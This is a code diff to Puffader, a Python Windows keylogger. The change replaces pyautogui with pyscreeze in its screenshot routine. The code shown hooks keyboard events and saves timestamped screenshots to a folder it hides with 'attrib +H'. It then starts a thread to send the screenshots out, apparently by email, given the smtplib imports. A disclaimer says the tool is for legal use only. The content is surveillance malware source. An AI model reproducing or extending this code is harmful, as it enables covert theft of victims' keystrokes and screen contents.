@@ -8,7 +8,7 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import smtplib, time, os, threading, sys, subprocess, pythoncom, pyHook, pyautogui
+import smtplib, time, os, threading, sys, subprocess, pythoncom, pyHook, pyscreeze
 import win32console, win32gui, win32event, win32api, winerror, win32clipboard
 from sys import exit; from urllib2 import urlopen; from shutil import copyfile
 from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
@@ -219,14 +219,14 @@ def OnKeyboardEvent(event):
 
     def TakeScr():  # function to take screenshot
         if blnStoreLocal == "True":
-            threading.Thread(pyautogui.screenshot().save(time.strftime(strScrDir + "/%Y%m%d%H%M%S" + ".png"))).start()
+            threading.Thread(pyscreeze.screenshot().save(time.strftime(strScrDir + "/%Y%m%d%H%M%S" + ".png"))).start()
         else:
             if not os.path.isdir(cPuffDir):  # if the screen dir doesnt exist, create it
                 os.makedirs(cPuffDir)
                 subprocess.Popen(["attrib", "+H", cPuffDir])  # make folder hidden
 
             strScrPath = time.strftime(cPuffDir + "/%Y%m%d%H%M%S" + ".png")  # save screenshot with datetime format
-            threading.Thread(pyautogui.screenshot().save(strScrPath)).start()
+            threading.Thread(pyscreeze.screenshot().save(strScrPath)).start()
             SendScreenThread = threading.Thread(target=SendScreen)
             SendScreenThread.daemon = True
             SendScreenThread.start()
